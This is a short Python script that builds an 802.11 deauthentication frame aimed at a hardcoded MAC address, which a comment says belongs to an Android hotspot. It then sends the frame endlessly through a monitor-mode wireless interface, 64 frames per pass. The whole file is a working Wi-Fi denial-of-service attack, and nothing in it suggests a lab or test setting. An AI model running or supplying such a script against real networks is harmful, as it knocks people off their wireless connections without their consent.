import os
from time import sleep

from core.frame import DeauthenticationFrame
from core.sniffer import PacketSender

iface = "wlp4s0mon"

# random mac from android hot spot
frame = DeauthenticationFrame("a2:cf:2d:38:59:0c")

sender = PacketSender(iface)

while True:
    for _ in range(64):
        sender.send(frame.to_bytes())
